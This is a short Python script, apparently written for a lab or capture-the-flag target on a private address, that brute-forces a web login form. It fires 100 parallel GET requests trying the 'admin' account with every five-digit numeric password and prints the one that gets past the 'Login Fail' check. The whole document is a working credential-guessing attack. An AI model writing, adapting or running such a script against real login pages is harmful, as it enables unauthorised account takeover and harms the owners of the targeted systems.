import requests
from concurrent.futures import ThreadPoolExecutor

def check_password(password):
    if password%1000==0:
        print(str(password))
    credentials['pw'] = str(password)
    response = requests.get(login_url, params=credentials)
    if 'Login Fail' in response.text and response.text.count('Login Fail') >= 2:
        return None
    else:
        return f"Success! Password found: {password}\n{response.text}"

login_url = 'http://192.168.0.45:22222' 
credentials = {'id': 'admin', 'pw': '','login2':2}

with ThreadPoolExecutor(max_workers=100) as executor:
    for result in executor.map(check_password, range(10000, 99999)):
        if result:
            print(result)
            break
